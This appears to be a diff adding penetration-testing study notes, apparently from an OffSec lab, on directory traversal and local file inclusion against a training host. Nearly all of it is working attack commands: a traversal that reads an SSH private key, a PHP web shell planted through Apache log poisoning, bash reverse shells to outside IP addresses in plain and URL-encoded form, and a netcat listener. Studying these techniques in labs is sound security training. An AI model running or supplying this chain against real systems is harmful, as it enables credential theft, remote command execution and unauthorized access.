@@ -1,0 +1,20 @@
+1. curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+	2. ssh -i dt_key -p 2222 offsec@mountaindesserts.co
+- Local File Inclusion (LFI)
+	- Example 1
+		- curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+		- <?php echo system($_GET['cmd']); ?>
+		- ../../../../../../../../../var/log/apache2/access.log
+		- - ../../../../../../../../../var/log/apache2/access.log&cmd=ps
+	- URL Encoding ---> Space = %20
+	- Reverse Shell
+		- bash -i >& /dev/tcp/192.168.45.174/4444 0>&1
+	- -c to make sure it executes in bash
+		- bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+		- URL encoding
+			- bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+		- Start Netcat listener
+			- nc -lvnp 4444
+	- XAMPP
+		- Log Files
+			- C:\xampp\apache\logs\
